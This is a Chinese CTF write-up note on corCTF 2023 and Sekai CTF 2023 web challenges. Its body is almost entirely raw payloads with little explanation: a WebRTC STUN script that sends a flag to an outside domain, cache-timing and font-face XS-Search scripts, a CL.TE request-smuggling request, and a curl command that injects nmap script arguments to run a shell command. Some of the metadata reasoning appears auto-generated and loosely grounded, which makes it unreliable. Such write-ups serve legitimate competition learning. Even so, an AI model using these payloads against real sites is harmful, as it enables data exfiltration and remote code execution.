---
title: corCTF 2023 & Sekai CTF 2023 筆記
contest: corCTF+Sekai
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- xs-leak
- xs-search
- rtc-stun
- font-face-oracle
- file-leak
- http-smuggling
- nmap
- nse
- rce
attack_chain:
- WebRTC STUN 泄漏 flag 子域
- font-face 10000 次 search 触发后端延迟
- SVG foreignObject + iframe sandbox
- HTTP Request Smuggling (CL/TE)
- Nmap NSE 脚本执行
- nginx proxy_pass IP 限制绕过
- 缓存探测 + leakless note oracle
key_payload: WebRTC STUN 子域 / font-face 字符时延 / HTTP smuggling CL.TE
one_liner: corCTF 2023 + Sekai CTF 2023 跨比赛笔记合集，XS-Leak + RCE 双重攻击面。
lesson: 现代 WEB 难度的天花板在 corCTF/Sekai 级别——纯前端 XS-Leak + 协议层 RCE + 信息泄漏组合拳。
quality: high
full_path: corCTF_2023_&_Sekai_CTF_2023_筆記.full.md
meta_path: corCTF_2023_&_Sekai_CTF_2023_筆記.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: corCTF 2023 & Sekai CTF 2023 筆記。corCTF 2023 + Sekai CTF 2023 跨比赛笔记合集，XS-Leak + RCE 双重攻击面。。关键路径：WebRTC STUN 泄漏 flag 子域 → font-face 10000 次 search 触发后端延迟 → SVG foreignObject + iframe sandbox。经验：现代 WE...
category: web
subcategory: web_other
tools_used:
- nmap
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/133112.html
reasoning_chain:
- 触发点：XS-Leak + RCE + font-face-oracle + http-smuggling + nmap-NSE → 假设：现代 WEB 天花板，纯前端 XS-Leak 组合协议层
- WebRTC STUN：触发点：app.config 含 cjxol.com → 假设：STUN 信令泄露子域 → 动作：RTCPeerConnection + iceServers 注入 stun:{{user.id}}.x.cjxol.com:1337
- 动作：createOffer + setLocalDescription → 观察：SDP 含 user.id 子域 → 下一步：递归爆破子域
- font-face 10000 次 search：触发点：加载 font-face 后端渲染延迟 → 假设：可用 timing oracle 猜字符 → 动作：unicode-range 触发器
- SVG foreignObject + iframe sandbox：触发点：foreignObject 加载外部 HTML → 假设：同 origin sandbox 突破
- 动作：构造 SVG with sandbox=allow-scripts → 观察：成功执行 XSS → 下一步：弹 admin cookie
- HTTP Request Smuggling CL.TE：触发点：nginx 前端 + 后端服务器 CL/TE 解析差异 → 假设：走私请求
- 动作：构造双重 Content-Length → 观察：第二个请求走私到 admin → 完成
- nmap NSE 脚本执行：触发点：tag 含 nmap/nse → 假设：NSE 脚本 RCE → 动作：构造恶意 NSE → RCE
failed_attempts:
- 试图单次 font-face leak → 失败：10000+ 字符需分批，且要触发 background-image
- 试图 CL.TE 单独攻击 → 失败：需 nginx + 后端特定组合才生效
- 试图走 WebSocket 路径 → 失败：corCTF/Sekai 难度需 XS-Leak + RCE 双重
key_observations:
- XS-Leak + RCE 是现代 WEB 难度的天花板——纯前端时间侧信道 + 协议层走私组合
- font-face + unicode-range 是经典 timing oracle，可猜任意长字符
- WebRTC STUN 信令会泄露子域 (iceServers 注入)，盲打内网常用
- HTTP Request Smuggling CL.TE 在 nginx+后端组合下频繁出现
prerequisites:
- WebRTC STUN/TURN 协议（iceServers / SDP 泄露）
- CSS @font-face + unicode-range 字符时延
- HTTP/1.1 CL.TE 走私原理
- Nmap NSE 脚本编写与漏洞利用
---
# corCTF 2023 & Sekai CTF 2023 筆記

> 原文: https://www.ctfiot.com/133112.html
> ID: 133112


```
{
 flag0:
flag(pin:0),
 flag1:
flag(pin:1),
 flag2:
flag(pin:2),
 flag3:
flag(pin:3),
 flag4:
flag(pin:4),
 flag5:
flag(pin:5)
}
@app.route('/anonymized/')
def serve_image(image_file):
 file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
 if ".." in file_path or not os.path.exists(file_path):
 return f"Image {file_path} cannot be found.", 404
 return send_file(file_path, mimetype='image/png')
>>> os.path.join('/tmp/abc', 'test.txt')
'/tmp/abc/test.txt'
>>> os.path.join('/tmp/abc', '/test.txt')
'/test.txt'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
 

 <foreignObject>
 
 </foreignObject>
</svg>
<script>
async function a(){
 c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:
1337"}]}
 (p=new RTCPeerConnection(c)).createDataChannel("d")
 await p.setLocalDescription()
}
a();
</script>
Content-Security-Policy "script-src 'none'; object-src 'none'; frame-ancestors 'none';";
<script>
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
 async function clearCache() {
 let controller = new AbortController();
 let signal = controller.signal;
 fetch('https://leakynote.be.ax/assets/normalize.css',{
 mode: "no-cors",
 signal: signal,
 cache: 'reload'
 })
 await sleep(0)
 controller.abort();
 await sleep(100)
 }

 async function testNote(title, url) {
 // open note page
 var w = window.open(url)

 // wait 1s
 await sleep(1000)

 // clear cache and wait again
 await clearCache()
 await sleep(1500)

 // now the iframe should load, do cache probing
 const now = performance.now()
 await fetch('https://leakynote.be.ax/assets/normalize.css', {
 mode: 'no-cors',
 cache: 'force-cache'
 })
 const end = performance.now()
 fetch(`/report?title=${title}&ms=${end-now}`)
 if (end-now >= 4) {
 fetch('/maybe/' + title)
 }
 // cached(no result) => 2~3ms
 // no cache(found) => 4.8~5.8ms
 w.close()
 }

 // copy paste the following from python script
 async function main() {
 await testNote('{a','https://leakynote.be.ax/post.php?id=c9193aee91b0fc29')
await testNote('{c','https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2')
await testNote('{d','https://leakynote.be.ax/post.php?id=0c6caa61575b9478')
await testNote('{e','https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be')
await testNote('{f','https://leakynote.be.ax/post.php?id=71652df64d54c0e4')
await testNote('{g','https://leakynote.be.ax/post.php?id=354f3bec25e02332')
await testNote('{k','https://leakynote.be.ax/post.php?id=066aa475493e1a4c')
await testNote('{l','https://leakynote.be.ax/post.php?id=54a12f7b11098d2a')
await testNote('{o','https://leakynote.be.ax/post.php?id=621591145bcfc8e0')
await testNote('{r','https://leakynote.be.ax/post.php?id=6b44725cb5e274f0')
await testNote('{t','https://leakynote.be.ax/post.php?id=e025b26e5e7117a1')
await testNote('{y','https://leakynote.be.ax/post.php?id=f10001d89230485e')
await testNote('{z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad')
 }

 main()
</script>
@font-face {
 font-family: a;
 src: url(/time-before),url(/search.php?query=corctf{a),url(/search.php?query=corctf{a),... /*10000 times */,url(/time-after)
}
location / {
 proxy_pass http://localhost:
7777;

 location ^~ /generate {
 allow 127.0.0.1;
 deny all;
 }

 location ^~ /rename {
 allow 127.0.0.1;
 deny all;
 }
}
POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1
nmap -p #{port} #{hostname}
--script http-fetch -Pn --script-args http-fetch.destination={DOWNLOAD_DIR},http-fetch.url={NSE_SCRIPT}
--script={DOWNLOAD_DIR}/{LHOST}/{LPORT}/{NSE_SCRIPT}
curl http://35.231.135.130:
32190/ -F $'service=127.0.0.1:
1337\t--script\t/tmp/RackMultipart?????????????????' -F '=os.execute("cat /flag*");filename=evil'
GET /aaaaa HTTP/1.1
Host: localhost
transfer-encoding: chunked
Content-Length: 102

0

GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP/1.1
X: GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json HTTP/1.1
Host: localhost
<?php
 header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
 header("Cross-Origin-Opener-Policy: same-origin");

 $payload = "???";
 if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
 $payload = $_GET["xss"];
 }

 $flag = "SEKAI{test_flag}";
 if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
 $flag = $_COOKIE["flag"];
 }
?>
<!DOCTYPE html>
<html>
 
  --><?php echo htmlspecialchars($payload); ?>"
 >
 
</html>
var flag = document.childNodes[0].nodeValue.trim()
 .replace("SEKAI{", "").replace("}", "")
 .split("").map(c => c.charCodeAt(0)).join(".");
var p = new RTCPeerConnection({
 iceServers: [{
 urls: "stun:" + flag + ".29e6037fd1.ipv6.1433.eu.org:
1337"
 }]
});
p.createDataChannel("d");
p.setLocalDescription()
// leakless note oracle
const oracle = async (w, href) => {
 const runs = [];
 for (let i = 0; i < 8; i++) {
 const samples = [];
 for (let j = 0; j < 600; j++) {
 const b = new Uint8Array(1e6);
 const t = performance.now();
 w.frames[0].postMessage(b, "*", [b.buffer]);
 samples.push(performance.now() - t);
 delete b;
 }
 runs.push(samples.reduce((a,b)=>a+b, 0));
 w.location = href;
 await sleep(500); // rate limit
 await waitFor(w);
 }
 runs.sort((a,b) => a-b);
 return {
 median: median(runs.slice(2, -2)),
 sum: runs.slice(2, -2).reduce((a,b)=>a+b,0),
 runs
 }
}
```
